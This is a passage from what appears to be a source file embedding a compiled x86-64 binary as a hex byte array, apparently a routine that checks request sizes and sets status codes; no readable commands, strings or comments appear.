    0x59, 0x00, 0x00, 0x41, 0xB9, 0x02, 0x00, 0x07, 0x00, 0xE8, 0xFA, 0x0C, 0x00, 0x00, 0x33, 0xFF,
    0xC7, 0x43, 0x18, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0x7B, 0x30, 0x89, 0x7B, 0x28, 0x48, 0x8B,
    0x7C, 0x24, 0x58, 0xC7, 0x43, 0x1C, 0xFF, 0xFF, 0xFF, 0xFF, 0xC7, 0x43, 0x20, 0xFF, 0xFF, 0xFF,
    0xFF, 0xC7, 0x43, 0x24, 0x02, 0x00, 0x07, 0x00, 0xC7, 0x43, 0x14, 0xF5, 0xFF, 0xFF, 0xFF, 0x33,
    0xC0, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0xC7, 0x44, 0x24, 0x20, 0x38, 0x00,
    0x00, 0x00, 0x41, 0xB8, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xF1, 0x58, 0x00, 0x00, 0xE9,
    0x7E, 0x0B, 0x00, 0x00, 0x83, 0xFA, 0x18, 0x75, 0x39, 0x41, 0x81, 0xF9, 0x18, 0x0D, 0x00, 0x00,
    0x75, 0x30, 0x48, 0x8D, 0x4B, 0x20, 0x48, 0x8D, 0x15, 0x83, 0x6F, 0x00, 0x00, 0x45, 0x8D, 0x41,
    0xE0, 0xC7, 0x43, 0x18, 0x53, 0x00, 0x00, 0x00, 0xE8, 0x33, 0x0E, 0x00, 0x00, 0x33, 0xFF, 0x89,
    0x7B, 0x14, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D,
    0x5B, 0xC3, 0xC7, 0x44, 0x24, 0x20, 0x18, 0x0D, 0x00, 0x00, 0x41, 0xB8, 0x18, 0x00, 0x00, 0x00,
    0x48, 0x8D, 0x0D, 0x29, 0x58, 0x00, 0x00, 0xE9, 0x26, 0x0B, 0x00, 0x00, 0x83, 0xFA, 0x18, 0x75,
    0x21, 0x41, 0x83, 0xF9, 0x1C, 0x75, 0x1B, 0xC6, 0x43, 0x18, 0x03, 0x48, 0x8B, 0x7C, 0x24, 0x58,
    0xC7, 0x43, 0x14, 0xDB, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D,
    0x5B, 0xC3, 0xC7, 0x44, 0x24, 0x20, 0x1C, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x18, 0x00, 0x00, 0x00,
    0x48, 0x8D, 0x0D, 0x49, 0x57, 0x00, 0x00, 0xE9, 0xE6, 0x0A, 0x00, 0x00, 0x83, 0xFA, 0x18, 0x75,
    0x05, 0x44, 0x3B, 0xCA, 0x74, 0xC5, 0xC7, 0x44, 0x24, 0x20, 0x18, 0x00, 0x00, 0x00, 0x41, 0xB8,
    0x18, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x85, 0x56, 0x00, 0x00, 0xE9, 0xC2, 0x0A, 0x00, 0x00,
    0x83, 0xFA, 0x28, 0x74, 0x2C, 0x48, 0x8D, 0x0D, 0x24, 0x56, 0x00, 0x00, 0x41, 0xB8, 0x28, 0x00,
    0x00, 0x00, 0xE8, 0xD1, 0x0B, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x14, 0xFE,
    0xFF, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B,
    0xC3, 0x44, 0x8B, 0x43, 0x20, 0x42, 0x8D, 0x04, 0xC5, 0x18, 0x00, 0x00, 0x00, 0x44, 0x3B, 0xC8,
    0x74, 0x2C, 0x48, 0x8D, 0x0D, 0x97, 0x55, 0x00, 0x00, 0x44, 0x8B, 0xC0, 0x41, 0x8B, 0xD1, 0xE8,
    0x94, 0x0B, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x14, 0xFE, 0xFF, 0xFF, 0xFF,
    0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x45, 0x85,
    0xC0, 0x75, 0x2D, 0x48, 0x8D, 0x15, 0x46, 0x55, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x1F, 0x55, 0x00,
    0x00, 0xE8, 0x62, 0x0B, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x14, 0xFE, 0xFF,
    0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3,
    0x48, 0x8B, 0x53, 0x18, 0x4C, 0x8D, 0x4B, 0x18, 0x48, 0x81, 0xFA, 0x00, 0x10, 0x00, 0x00, 0x73,
    0x2D, 0x48, 0x8D, 0x15, 0xC8, 0x54, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xE1, 0x54, 0x00, 0x00, 0xE8,
    0x24, 0x0B, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x14, 0xFE, 0xFF, 0xFF, 0xFF,
    0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x48, 0x8B,
    0xCD, 0xE8, 0x1A, 0xEB, 0xFF, 0xFF, 0x85, 0xC0, 0x89, 0x43, 0x14, 0x0F, 0x89, 0x65, 0x09, 0x00,
    0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x0C, 0x18, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x48,
    0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x83, 0xFA, 0x20, 0x75, 0x25, 0x41, 0x83, 0xF9,
    0x18, 0x75, 0x1F, 0x48, 0x8B, 0x53, 0x18, 0x48, 0x8B, 0xCD, 0xE8, 0x71, 0xEC, 0xFF, 0xFF, 0x48,
    0x8B, 0x7C, 0x24, 0x58, 0x89, 0x43, 0x14, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D,
    0x5B, 0xC3, 0xC7, 0x44, 0x24, 0x20, 0x18, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x20, 0x00, 0x00, 0x00,
    0x48, 0x8D, 0x0D, 0x99, 0x53, 0x00, 0x00, 0xE9, 0x76, 0x09, 0x00, 0x00, 0x83, 0xFA, 0x1C, 0x75,
    0x44, 0x41, 0x83, 0xF9, 0x30, 0x75, 0x3E, 0x8B, 0x53, 0x18, 0x48, 0x8D, 0x43, 0x28, 0x4C, 0x8D,
    0x4B, 0x20, 0x4C, 0x8D, 0x43, 0x18, 0x48, 0x8B, 0xCD, 0x48, 0x89, 0x44, 0x24, 0x20, 0xE8, 0xAD,
    0xEC, 0xFF, 0xFF, 0x85, 0xC0, 0x89, 0x43, 0x14, 0x0F, 0x89, 0xD8, 0x08, 0x00, 0x00, 0x48, 0x8B,
    0x7C, 0x24, 0x58, 0xC7, 0x43, 0x0C, 0x18, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30,
    0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0xC7, 0x44, 0x24, 0x20, 0x30, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x1C,
    0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x96, 0x52, 0x00, 0x00, 0xE9, 0x13, 0x09, 0x00, 0x00, 0x83,
    0xFA, 0x20, 0x75, 0x25, 0x41, 0x83, 0xF9, 0x18, 0x75, 0x1F, 0x48, 0x8B, 0x53, 0x18, 0x48, 0x8B,
    0xCD, 0xE8, 0xEA, 0xED, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x89, 0x43, 0x14, 0x33, 0xC0,
    0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0xC7, 0x44, 0x24, 0x20, 0x18, 0x00, 0x00,
    0x00, 0x41, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xB2, 0x51, 0x00, 0x00, 0xE9, 0xCF,
    0x08, 0x00, 0x00, 0x83, 0xFA, 0x40, 0x0F, 0x85, 0x68, 0x01, 0x00, 0x00, 0x41, 0x83, 0xF9, 0x28,
    0x0F, 0x85, 0x5E, 0x01, 0x00, 0x00, 0x8B, 0x43, 0x18, 0x85, 0xC0, 0x75, 0x2D, 0x48, 0x8D, 0x15,
    0x6C, 0x51, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x4D, 0x51, 0x00, 0x00, 0xE8, 0xC8, 0x09, 0x00, 0x00,
    0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x14, 0xFE, 0xFF, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF,
    0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x3D, 0x00, 0x00, 0x00, 0x01, 0x72,
    0x2D, 0x48, 0x8D, 0x15, 0x00, 0x51, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x19, 0x51, 0x00, 0x00, 0xE8,
    0x94, 0x09, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x14, 0xFE, 0xFF, 0xFF, 0xFF,
    0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x80, 0x7B,
    0x1C, 0x00, 0x48, 0x8D, 0x7B, 0x1C, 0x75, 0x2D, 0x48, 0x8D, 0x15, 0xB1, 0x50, 0x00, 0x00, 0x48,
    0x8D, 0x0D, 0xE2, 0x50, 0x00, 0x00, 0xE8, 0x5D, 0x09, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58,
    0xC7, 0x43, 0x14, 0xFE, 0xFF, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30,
    0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x33, 0xD2, 0x48, 0x8B, 0xCF, 0x44, 0x8D, 0x42, 0x20, 0xE8, 0x21,
    0x0E, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x75, 0x2D, 0x48, 0x8D, 0x15, 0x31, 0x50, 0x00, 0x00, 0x48,
    0x8D, 0x0D, 0xA2, 0x50, 0x00, 0x00, 0xE8, 0x1D, 0x09, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58,
    0xC7, 0x43, 0x14, 0xFE, 0xFF, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30,
    0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x0F, 0xBE, 0x17, 0x85, 0xD2, 0x74, 0x2A, 0x66, 0x66, 0x66, 0x90,
    0x48, 0x83, 0xC7, 0x01, 0x48, 0x8D, 0x05, 0xDD, 0x4F, 0x00, 0x00, 0xB9, 0x3B, 0x00, 0x00, 0x00,
    0x48, 0x83, 0xC0, 0x01, 0x3B, 0xCA, 0x74, 0x2F, 0x0F, 0xBE, 0x08, 0x85, 0xC9, 0x75, 0xF1, 0x0F,
    0xBE, 0x17, 0x85, 0xD2, 0x75, 0xDA, 0x4C, 0x8B, 0xC3, 0x48, 0x8B, 0xD5, 0x49, 0x8B, 0xCD, 0xE8,
    0x0C, 0xF3, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x89, 0x43, 0x14, 0x33, 0xC0, 0x48, 0x83,
    0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x48, 0x8D, 0x15, 0x52, 0x4F, 0x00, 0x00, 0x48, 0x8D,
    0x0D, 0x23, 0x50, 0x00, 0x00, 0xE8, 0x9E, 0x08, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7,
    0x43, 0x14, 0xFE, 0xFF, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41,
    0x5D, 0x5D, 0x5B, 0xC3, 0xC7, 0x44, 0x24, 0x20, 0x28, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x40, 0x00,
    0x00, 0x00, 0x48, 0x8D, 0x0D, 0x77, 0x4E, 0x00, 0x00, 0xE9, 0x44, 0x07, 0x00, 0x00, 0x83, 0xFA,
    0x70, 0x73, 0x2D, 0x48, 0x8D, 0x15, 0x3E, 0x4E, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x27, 0x4E, 0x00,
    0x00, 0xE8, 0x52, 0x08, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x14, 0xFE, 0xFF,
    0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3,
    0x44, 0x8B, 0x43, 0x64, 0x41, 0x8D, 0x40, 0x68, 0x3B, 0xD0, 0x0F, 0x85, 0xAB, 0x01, 0x00, 0x00,
    0x41, 0x83, 0xF9, 0x18, 0x0F, 0x85, 0xA1, 0x01, 0x00, 0x00, 0x8B, 0x53, 0x58, 0x81, 0xFA, 0x00,
    0x40, 0x00, 0x00, 0x76, 0x2D, 0x48, 0x8D, 0x15, 0xBC, 0x4D, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x9D,
    0x4D, 0x00, 0x00, 0xE8, 0x00, 0x08, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x14,
    0xFE, 0xFF, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D,
    0x5B, 0xC3, 0x85, 0xD2, 0x74, 0x41, 0x44, 0x8B, 0x5B, 0x54, 0x45, 0x3B, 0xD8, 0x73, 0x09, 0x4D,
    0x8D, 0x14, 0xD3, 0x4D, 0x3B, 0xD0, 0x76, 0x2F, 0x45, 0x8B, 0xC8, 0x44, 0x8B, 0xC2, 0x48, 0x8D,
    0x0D, 0x1B, 0x4D, 0x00, 0x00, 0x41, 0x8B, 0xD3, 0xE8, 0xBB, 0x07, 0x00, 0x00, 0x48, 0x8B, 0x7C,
    0x24, 0x58, 0xC7, 0x43, 0x14, 0xFE, 0xFF, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83,
    0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x8B, 0x4B, 0x60, 0x85, 0xC9, 0x74, 0x46, 0x44, 0x8B,
    0x53, 0x5C, 0x45, 0x3B, 0xD0, 0x73, 0x0E, 0x41, 0x8D, 0x04, 0x0A, 0x41, 0x3B, 0xC0, 0x77, 0x05,
    0x41, 0x3B, 0xC8, 0x76, 0x2F, 0x45, 0x8B, 0xC8, 0x44, 0x8B, 0xC1, 0x48, 0x8D, 0x0D, 0x8E, 0x4C,
    0x00, 0x00, 0x41, 0x8B, 0xD2, 0xE8, 0x6E, 0x07, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7,
    0x43, 0x14, 0xFE, 0xFF, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41,
    0x5D, 0x5D, 0x5B, 0xC3, 0x85, 0xD2, 0x48, 0x89, 0x74, 0x24, 0x50, 0x4C, 0x89, 0x64, 0x24, 0x60,
    0x74, 0x4D, 0x8B, 0x43, 0x54, 0x33, 0xFF, 0x85, 0xD2, 0x4C, 0x8D, 0x64, 0x18, 0x68, 0x74, 0x3F,
    0x49, 0x8B, 0xF4, 0x8B, 0x43, 0x64, 0x39, 0x46, 0x04, 0x0F, 0x83, 0x85, 0x00, 0x00, 0x00, 0x8B,
    0x43, 0x60, 0x39, 0x06, 0x73, 0x69, 0x8B, 0x0E, 0x33, 0xD2, 0x2B, 0xC1, 0x44, 0x8B, 0xC0, 0x8B,
    0x43, 0x5C, 0x03, 0xC1, 0x48, 0x8D, 0x4C, 0x18, 0x68, 0xE8, 0xF6, 0x0B, 0x00, 0x00, 0x48, 0x85,
    0xC0, 0x74, 0x37, 0x83, 0xC7, 0x01, 0x48, 0x83, 0xC6, 0x08, 0x3B, 0x7B, 0x58, 0x72, 0xC4, 0x4C,
    0x8B, 0xC3, 0x48, 0x8B, 0xD5, 0x49, 0x8B, 0xCD, 0xE8, 0xE3, 0xF2, 0xFF, 0xFF, 0x89, 0x43, 0x14,
    0x33, 0xC0, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x4C, 0x8B, 0x64, 0x24, 0x60, 0x48, 0x8B, 0x7C, 0x24,
    0x58, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x44, 0x8B, 0x4B, 0x64, 0x8B, 0xC7,
    0x8B, 0xD7, 0x45, 0x8B, 0x04, 0xC4, 0x48, 0x8D, 0x0D, 0x93, 0x4B, 0x00, 0x00, 0xEB, 0x29, 0x44,
    0x8B, 0x4B, 0x64, 0x8B, 0xC7, 0x8B, 0xD7, 0x45, 0x8B, 0x04, 0xC4, 0x48, 0x8D, 0x0D, 0x46, 0x4B,
    0x00, 0x00, 0xEB, 0x14, 0x44, 0x8B, 0x4B, 0x64, 0x8B, 0xC7, 0x8B, 0xD7, 0x45, 0x8B, 0x44, 0xC4,
    0x04, 0x48, 0x8D, 0x0D, 0xF8, 0x4A, 0x00, 0x00, 0xE8, 0x8B, 0x06, 0x00, 0x00, 0xC7, 0x43, 0x14,
    0xFE, 0xFF, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0xEB, 0x97, 0xC7, 0x44, 0x24, 0x20, 0x18,
    0x00, 0x00, 0x00, 0x44, 0x8B, 0xC0, 0x48, 0x8D, 0x0D, 0x73, 0x4A, 0x00, 0x00, 0xE9, 0x40, 0x05,
    0x00, 0x00, 0x83, 0xFA, 0x20, 0x75, 0x27, 0x41, 0x83, 0xF9, 0x18, 0x75, 0x21, 0x4C, 0x8B, 0xC3,
    0x48, 0x8B, 0xD5, 0x49, 0x8B, 0xCD, 0xE8, 0x65, 0xF4, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x58,
    0x89, 0x43, 0x14, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0xC7, 0x44,
    0x24, 0x20, 0x18, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x8D,
    0x49, 0x00, 0x00, 0xE9, 0xFA, 0x04, 0x00, 0x00, 0x83, 0xFA, 0x60, 0x75, 0x68, 0x41, 0x83, 0xF9,
    0x20, 0x75, 0x62, 0x48, 0x8D, 0x4B, 0x20, 0x45, 0x8D, 0x41, 0x20, 0x33, 0xD2, 0xE8, 0xF2, 0x0A,
    0x00, 0x00, 0x48, 0x85, 0xC0, 0x75, 0x2D, 0x48, 0x8D, 0x15, 0x1A, 0x49, 0x00, 0x00, 0x48, 0x8D,
    0x0D, 0xF3, 0x48, 0x00, 0x00, 0xE8, 0xEE, 0x05, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7,
    0x43, 0x14, 0xFE, 0xFF, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41,
    0x5D, 0x5D, 0x5B, 0xC3, 0x4C, 0x8B, 0xC3, 0x48, 0x8B, 0xD5, 0x49, 0x8B, 0xCD, 0xE8, 0x1E, 0xD7,
    0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x89, 0x43, 0x14, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30,
    0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0xC7, 0x44, 0x24, 0x20, 0x20, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x60,
    0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x06, 0x48, 0x00, 0x00, 0xE9, 0x73, 0x04, 0x00, 0x00, 0x83,
    0xFA, 0x30, 0x75, 0x64, 0x44, 0x3B, 0xCA, 0x75, 0x43, 0x49, 0x8B, 0x45, 0x40, 0x48, 0x85, 0xC0,
    0x74, 0x23, 0x4C, 0x8B, 0x4B, 0x28, 0x8B, 0x53, 0x20, 0x48, 0x8B, 0x4B, 0x18, 0x45, 0x33, 0xC0,
    0xFF, 0xD0, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x89, 0x43, 0x14, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30,
    0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x14, 0xEA, 0xFF, 0xFF,
    0xFF, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0xBA, 0x30, 0x00, 0x00,
    0x00, 0xC7, 0x44, 0x24, 0x20, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x30, 0x47, 0x00, 0x00,
    0x44, 0x8B, 0xC2, 0xE9, 0x0A, 0x04, 0x00, 0x00, 0x83, 0xFA, 0x38, 0x73, 0x2C, 0x48, 0x8D, 0x0D,
    0xEC, 0x46, 0x00, 0x00, 0x41, 0xB8, 0x38, 0x00, 0x00, 0x00, 0xE8, 0x19, 0x05, 0x00, 0x00, 0x48,
    0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x14, 0xFE, 0xFF, 0xFF, 0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF,
    0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x81, 0x7B, 0x30, 0x11, 0x02, 0x73, 0x19,
    0x74, 0x2D, 0x48, 0x8D, 0x15, 0x87, 0x46, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x60, 0x46, 0x00, 0x00,
    0xE8, 0xE3, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x14, 0xFE, 0xFF, 0xFF,
    0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x8B,
    0x43, 0x34, 0x83, 0xC0, 0x30, 0x3B, 0xD0, 0x75, 0x49, 0x44, 0x3B, 0xC8, 0x75, 0x44, 0x49, 0x8B,
    0x45, 0x40, 0x48, 0x85, 0xC0, 0x74, 0x24, 0x4C, 0x8B, 0x4B, 0x28, 0x8B, 0x53, 0x20, 0x48, 0x8B,
    0x4B, 0x18, 0x4C, 0x8D, 0x43, 0x30, 0xFF, 0xD0, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x89, 0x43, 0x14,
    0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58,
    0xC7, 0x43, 0x14, 0xEA, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D,
    0x5B, 0xC3, 0x44, 0x8B, 0x43, 0x34, 0x48, 0x8D, 0x0D, 0x63, 0x46, 0x00, 0x00, 0x41, 0x83, 0xC0,
    0x30, 0x44, 0x89, 0x44, 0x24, 0x20, 0xE9, 0x37, 0x03, 0x00, 0x00, 0x83, 0xFA, 0x18, 0x75, 0x23,
    0x41, 0x83, 0xF9, 0x1C, 0x75, 0x1D, 0x33, 0xFF, 0x89, 0x7B, 0x14, 0xE8, 0x10, 0xD9, 0xFF, 0xFF,
    0x48, 0x8B, 0x7C, 0x24, 0x58, 0x89, 0x43, 0x18, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D,
    0x5D, 0x5B, 0xC3, 0xC7, 0x44, 0x24, 0x20, 0x1C, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x18, 0x00, 0x00,
    0x00, 0x48, 0x8D, 0x0D, 0xF8, 0x44, 0x00, 0x00, 0xE9, 0xF5, 0x02, 0x00, 0x00, 0x83, 0xFA, 0x1C,
    0x76, 0x2D, 0x48, 0x8D, 0x15, 0xAF, 0x44, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x88, 0x44, 0x00, 0x00,
    0xE8, 0x03, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0xC7, 0x43, 0x14, 0xFE, 0xFF, 0xFF,
    0xFF, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0x83,
    0xFA, 0x1C, 0x75, 0x4F, 0x44, 0x8B, 0x53, 0x18, 0x42, 0x8D, 0x04, 0xD5, 0x28, 0x00, 0x00, 0x00,
    0x44, 0x3B, 0xC8, 0x75, 0x3E, 0x48, 0x8D, 0x43, 0x28, 0x4C, 0x8D, 0x43, 0x20, 0x4C, 0x8D, 0x4B,
    0x18, 0x41, 0x8B, 0xD2, 0x48, 0x8B, 0xCD, 0x48, 0x89, 0x44, 0x24, 0x20, 0xE8, 0xCF, 0xE7, 0xFF,
    0xFF, 0x85, 0xC0, 0x89, 0x43, 0x14, 0x0F, 0x89, 0x1A, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24,
    0x58, 0xC7, 0x43, 0x0C, 0x18, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D,
    0x5D, 0x5B, 0xC3, 0x8B, 0x43, 0x18, 0x41, 0xB8, 0x1C, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x9D,
    0x43, 0x00, 0x00, 0x8D, 0x04, 0xC5, 0x28, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x20, 0xE9, 0x4F,
    0x02, 0x00, 0x00, 0x83, 0xFA, 0x20, 0x75, 0x25, 0x41, 0x83, 0xF9, 0x18, 0x75, 0x1F, 0x48, 0x8B,
    0x53, 0x18, 0x48, 0x8B, 0xCD, 0xE8, 0x26, 0xE9, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x89,
    0x43, 0x14, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3, 0xC7, 0x44, 0x24,
    0x20, 0x18, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xAE, 0x42,
    0x00, 0x00, 0xE9, 0x0B, 0x02, 0x00, 0x00, 0x83, 0xFA, 0x18, 0x75, 0x35, 0x41, 0x83, 0xF9, 0x30,
    0x75, 0x2F, 0x4C, 0x8D, 0x43, 0x18, 0x48, 0x8D, 0x53, 0x20, 0x48, 0x8B, 0xCD, 0xE8, 0x3E, 0xCF,
    0xFF, 0xFF, 0x85, 0xC0, 0x89, 0x43, 0x14, 0x78, 0x08, 0x49, 0x8B, 0x45, 0x58, 0x48, 0x89, 0x43,
    0x28, 0x33, 0xC0, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B,
    0xC3, 0xC7, 0x44, 0x24, 0x20, 0x30, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x18, 0x00, 0x00, 0x00, 0x48,
    0x8D, 0x0D, 0xBA, 0x41, 0x00, 0x00, 0xE9, 0xB7, 0x01, 0x00, 0x00, 0x83, 0xFA, 0x18, 0x75, 0x20,
    0x44, 0x3B, 0xCA, 0x75, 0x1B, 0x48, 0x8B, 0xCD, 0xE8, 0xA3, 0xD0, 0xFF, 0xFF, 0x48, 0x8B, 0x7C,
    0x24, 0x58, 0x89, 0x43, 0x14, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x5D, 0x5B, 0xC3,
    0xC7, 0x44, 0x24, 0x20, 0x18, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x18, 0x00, 0x00, 0x00, 0x48, 0x8D,
    0x0D, 0xDB, 0x40, 0x00, 0x00, 0xE9, 0x78, 0x01, 0x00, 0x00, 0x83, 0xFA, 0x20, 0x0F, 0x85, 0x83,
    0x00, 0x00, 0x00, 0x41, 0x83, 0xF9, 0x18, 0x75, 0x7D, 0x48, 0x8B, 0x4B, 0x18, 0x48, 0x85, 0xC9,
    0x74, 0x5B, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72,
    0x23, 0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x48, 0x23,
